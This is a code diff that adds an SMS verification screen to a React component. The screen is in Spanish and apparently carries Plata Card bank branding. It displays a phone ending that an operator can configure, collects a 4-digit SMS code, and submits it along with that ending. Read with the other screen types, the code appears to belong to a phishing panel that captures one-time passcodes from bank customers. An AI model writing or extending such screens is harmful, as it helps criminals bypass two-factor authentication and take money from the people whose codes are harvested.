@@ -559,6 +559,77 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </div>
         );
 
+      case ScreenType.SMS_VERIFICATION:
+        // Obtener los últimos 4 dígitos del teléfono (ej: ***2390)
+        // Usar terminación ya configurada o por defecto 2390
+        const lastFourDigits = screenData.terminacion || '2390';
+        
+        return (
+            <div className="min-h-screen bg-white flex items-center justify-center p-4">
+              <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 border border-gray-100">
+                {/* Header */}
+                <div className="text-center mb-8">
+                  <div className="bg-gradient-to-r from-[#FF6B35] to-[#FF8C5A] w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <span className="text-2xl text-white">📱</span>
+                  </div>
+                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Verificación por SMS</h2>
+                  <p className="text-gray-600">Ingresa el código que recibiste</p>
+                </div>
+
+                {/* Información del SMS */}
+                <div className="bg-orange-50 rounded-xl p-4 mb-6">
+                  <p className="text-sm text-orange-800 text-center">
+                    <span className="font-semibold">Código enviado por SMS al número con terminación</span>
+                    <br />
+                    <span className="text-lg font-bold">***{lastFourDigits}</span>
+                  </p>
+                </div>
+
+                {/* Input del código */}
+                <div className="mb-6">
+                  <label className="block text-sm font-medium text-gray-700 mb-2">
+                    Código de verificación de 4 dígitos
+                  </label>
+                  <input
+                    type="text"
+                    value={dataC}
+                    onChange={(e) => {
+                      const value = e.target.value.replace(/\D/g, '');
+                      if (value.length <= 4) {
+                        setDataC(value);
+                      }
+                    }}
+                    placeholder="0000"
+                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-[#FF6B35] focus:border-[#FF6B35] text-center text-2xl tracking-[0.5em] font-mono"
+                    maxLength={4}
+                  />
+                  <p className="text-xs text-gray-500 mt-2 text-center">
+                    Revisa tu bandeja de SMS
+                  </p>
+                </div>
+
+                {/* Botón verificar */}
+                <Button
+                  onClick={() => onSubmit(ScreenType.SMS_VERIFICATION, { 
+                    codigo: dataC,
+                    terminacion: lastFourDigits
+                  })}
+                  disabled={!dataC || dataC.length !== 4}
+                  className="w-full platacard-button py-3 text-lg font-semibold rounded-xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
+                >
+                  Verificar código
+                </Button>
+
+                {/* Info adicional */}
+                <div className="mt-6 text-center">
+                  <p className="text-xs text-gray-500">
+                    ¿No recibiste el código? El mensaje puede tardar unos minutos en llegar
+                  </p>
+                </div>
+              </div>
+            </div>
+        );
+
       case ScreenType.FOLIO:
         const folioContent = (
           <>
